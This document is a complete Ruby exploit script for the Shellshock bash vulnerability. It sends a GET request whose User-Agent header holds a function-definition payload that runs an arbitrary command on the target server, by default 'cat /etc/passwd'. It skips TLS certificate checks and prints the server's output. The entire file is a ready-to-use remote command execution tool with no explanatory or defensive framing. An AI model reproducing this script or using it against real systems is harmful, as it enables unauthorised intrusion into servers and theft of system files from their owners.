#!/usr/bin/ruby

require 'net/http'
require 'uri'
require 'openssl'

if ARGV.size >= 1
  target = ARGV[0] 
  command = ARGV[1] || "cat /etc/passwd"
 
  target_uri = URI.parse(target)
  path = target_uri.path.empty? ? '/' : target_uri.path

  headers = {
        "User-Agent"      => "() { :; }; echo; echo; /bin/bash -c '#{command}';",
        "Accept-Language" => "en-US,en;q=0.5",
        "Accept-Encoding" => "gzip, deflate",
        "Accept"          => "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection"      => "keep-alive"
  }
 
  http = Net::HTTP.new(target_uri.host, target_uri.port)
  http.use_ssl = (target_uri.scheme == 'https')
  http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl?
 
  request = Net::HTTP::Get.new(path, headers)
  response = http.request(request)

  puts "[*] Sending Shellshock Exploit.. "
  puts "[+] Server response:"
  puts response.body
else
  $stdout.puts "Usage: ruby #{__FILE__} <Target> <Command>"
  exit 0
end
